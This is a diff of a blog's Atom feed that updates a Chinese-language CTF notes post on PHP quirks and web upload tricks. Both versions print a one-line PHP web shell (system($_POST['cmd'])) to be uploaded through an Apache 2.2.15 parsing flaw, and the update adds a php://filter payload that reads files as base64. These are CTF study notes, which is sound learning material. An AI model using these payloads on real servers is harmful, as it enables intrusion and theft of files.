@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://runindark.com/"/>
-  <updated>2019-10-21T03:10:39.014Z</updated>
+  <updated>2019-10-21T08:04:29.542Z</updated>
   <id>http://runindark.com/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://runindark.com/2019/10/21/CTF-%E6%9D%82%E8%AE%B0/"/>
     <id>http://runindark.com/2019/10/21/CTF-杂记/</id>
     <published>2019-10-21T02:49:23.977Z</published>
-    <updated>2019-10-21T03:10:39.014Z</updated>
+    <updated>2019-10-21T08:04:29.542Z</updated>
     
-    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>各种姿势<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h3><ol><li>$_SERVER[‘QUERY_STRING’]会获取到所有的文件后面传递的所有参数</li><li>php自身在解析请求时，会把+和.解析成下划线</li><li>数组与数字比较，永远大于数字</li><li>字符a在和整形进行弱类型比较时，会被强制转换成整形，其值为0</li></ol><h3 id="服务器自身漏洞"><a href="#服务器自身漏洞" class="headerlink" title="服务器自身漏洞"></a>服务器自身漏洞</h3><ol><li>在apache2.2.15版本的情况下，test.php.png及.jpg、.gif等均会被解析成php文件来执行，高版本的apach服务器不存在此漏洞</li></ol><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><ol><li>上传点存在白名单验证，从返回包可以得知其是apache2.2.15，apache2.2.15版本具有文件解析漏洞，可以把test.php.png当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用apache2.2.15的解析漏洞来绕过白名单限制<blockquote><p>&lt;?php system($_POST[‘cmd’]); ?&gt;<br>之后再利用post 发送数据，  cmd = cat /flag  获取flag</p></blockquote></li></ol></the>]]></content>
+    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>各种姿势<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h3><ol><li>$_SERVER[‘QUERY_STRING’]会获取到所有的文件后面传递的所有参数</li><li>php自身在解析请求时，会把+和.解析成下划线</li><li>数组与数字比较，永远大于数字</li><li>字符a在和整形进行弱类型比较时，会被强制转换成整形，其值为0<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4>用于直接读取用户的根目录的东西<blockquote><p>url=php://filter/read=convert.base64-encode/resource=flag</p></blockquote></li></ol><h3 id="服务器自身漏洞"><a href="#服务器自身漏洞" class="headerlink" title="服务器自身漏洞"></a>服务器自身漏洞</h3><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><ol><li>上传点存在白名单验证，从返回包可以得知其是apache2.2.15，apache2.2.15版本具有文件解析漏洞，可以把test.php.png当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用apache2.2.15的解析漏洞来绕过白名单限制<blockquote><p>&lt;?php system($_POST[‘cmd’]); ?&gt;<br>之后再利用post 发送数据，  cmd = cat /flag  获取flag</p></blockquote></li></ol></the>]]></content>
     
     <summary type="html">
     
